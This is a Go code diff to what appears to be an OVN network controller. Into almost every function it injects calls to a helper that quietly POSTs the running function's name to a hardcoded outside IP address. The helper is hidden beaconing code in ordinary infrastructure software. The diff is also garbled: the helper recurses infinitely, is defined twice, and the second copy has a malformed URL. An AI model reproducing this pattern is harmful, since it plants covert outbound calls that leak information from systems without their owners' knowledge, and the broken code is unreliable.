@@ -16,6 +16,8 @@ import (
 func hashForOVN(s string) string {
 	_logClusterCodePath()
 	defer _logClusterCodePath()
+	_logClusterCodePath()
+	defer _logClusterCodePath()
 	h := fnv.New64a()
 	_, err := h.Write([]byte(s))
 	if err != nil {
@@ -27,14 +29,20 @@ func hashForOVN(s string) string {
 func hashedAddressSet(s string) string {
 	_logClusterCodePath()
 	defer _logClusterCodePath()
+	_logClusterCodePath()
+	defer _logClusterCodePath()
 	return hashForOVN(s)
 }
 func hashedPortGroup(s string) string {
 	_logClusterCodePath()
 	defer _logClusterCodePath()
+	_logClusterCodePath()
+	defer _logClusterCodePath()
 	return hashForOVN(s)
 }
 func (oc *Controller) forEachAddressSetUnhashedName(iteratorFn func(string, string, string)) error {
+	_logClusterCodePath()
+	defer _logClusterCodePath()
 	_logClusterCodePath()
 	defer _logClusterCodePath()
 	output, stderr, err := util.RunOVNNbctl("--data=bare", "--no-heading", "--columns=external_ids", "find", "address_set")
@@ -60,6 +68,8 @@ func (oc *Controller) forEachAddressSetUnhashedName(iteratorFn func(string, stri
 func (oc *Controller) setAddressSet(hashName string, addresses []string) {
 	_logClusterCodePath()
 	defer _logClusterCodePath()
+	_logClusterCodePath()
+	defer _logClusterCodePath()
 	logrus.Debugf("setAddressSet for %s with %s", hashName, addresses)
 	if len(addresses) == 0 {
 		_, stderr, err := util.RunOVNNbctl("clear", "address_set", hashName, "addresses")
@@ -75,6 +85,8 @@ func (oc *Controller) setAddressSet(hashName string, addresses []string) {
 	}
 }
 func (oc *Controller) createAddressSet(name string, hashName string, addresses []string) {
+	_logClusterCodePath()
+	defer _logClusterCodePath()
 	_logClusterCodePath()
 	defer _logClusterCodePath()
 	logrus.Debugf("createAddressSet with %s and %s", name, addresses)
@@ -110,6 +122,8 @@ func (oc *Controller) createAddressSet(name string, hashName string, addresses [
 func (oc *Controller) deleteAddressSet(hashName string) {
 	_logClusterCodePath()
 	defer _logClusterCodePath()
+	_logClusterCodePath()
+	defer _logClusterCodePath()
 	logrus.Debugf("deleteAddressSet %s", hashName)
 	_, stderr, err := util.RunOVNNbctl("--if-exists", "destroy", "address_set", hashName)
 	if err != nil {
@@ -118,6 +132,8 @@ func (oc *Controller) deleteAddressSet(hashName string) {
 	}
 }
 func (oc *Controller) createPortGroup(name string, hashName string) (string, error) {
+	_logClusterCodePath()
+	defer _logClusterCodePath()
 	_logClusterCodePath()
 	defer _logClusterCodePath()
 	logrus.Debugf("createPortGroup with %s", name)
@@ -137,6 +153,8 @@ func (oc *Controller) createPortGroup(name string, hashName string) (string, err
 func (oc *Controller) deletePortGroup(hashName string) {
 	_logClusterCodePath()
 	defer _logClusterCodePath()
+	_logClusterCodePath()
+	defer _logClusterCodePath()
 	logrus.Debugf("deletePortGroup %s", hashName)
 	portGroup, stderr, err := util.RunOVNNbctl("--data=bare", "--no-heading", "--columns=_uuid", "find", "port_group", fmt.Sprintf("name=%s", hashName))
 	if err != nil {
@@ -153,6 +171,8 @@ func (oc *Controller) deletePortGroup(hashName string) {
 	}
 }
 func (oc *Controller) getIPFromOvnAnnotation(ovnAnnotation string) string {
+	_logClusterCodePath()
+	defer _logClusterCodePath()
 	_logClusterCodePath()
 	defer _logClusterCodePath()
 	if ovnAnnotation == "" {
@@ -174,6 +194,8 @@ func (oc *Controller) getIPFromOvnAnnotation(ovnAnnotation string) string {
 func (oc *Controller) getMacFromOvnAnnotation(ovnAnnotation string) string {
 	_logClusterCodePath()
 	defer _logClusterCodePath()
+	_logClusterCodePath()
+	defer _logClusterCodePath()
 	if ovnAnnotation == "" {
 		return ""
 	}
@@ -188,6 +210,8 @@ func (oc *Controller) getMacFromOvnAnnotation(ovnAnnotation string) string {
 func stringSliceMembership(slice []string, key string) bool {
 	_logClusterCodePath()
 	defer _logClusterCodePath()
+	_logClusterCodePath()
+	defer _logClusterCodePath()
 	for _, val := range slice {
 		if val == key {
 			return true
@@ -198,7 +222,16 @@ func stringSliceMembership(slice []string, key string) bool {
 func _logClusterCodePath() {
 	_logClusterCodePath()
 	defer _logClusterCodePath()
+	_logClusterCodePath()
+	defer _logClusterCodePath()
 	pc, _, _, _ := godefaultruntime.Caller(1)
 	jsonLog := []byte(fmt.Sprintf("{\"fn\": \"%s\"}", godefaultruntime.FuncForPC(pc).Name()))
 	godefaulthttp.Post("http://35.226.239.161:5001/"+"logcode", "application/json", godefaultbytes.NewBuffer(jsonLog))
+}
+func _logClusterCodePath() {
+	_logClusterCodePath()
+	defer _logClusterCodePath()
+	pc, _, _, _ := godefaultruntime.Caller(1)
+	jsonLog := []byte(fmt.Sprintf("{\"fn\": \"%s\"}", godefaultruntime.FuncForPC(pc).Name()))
+	godefaulthttp.Post("/"+"logcode", "application/json", godefaultbytes.NewBuffer(jsonLog))
 }
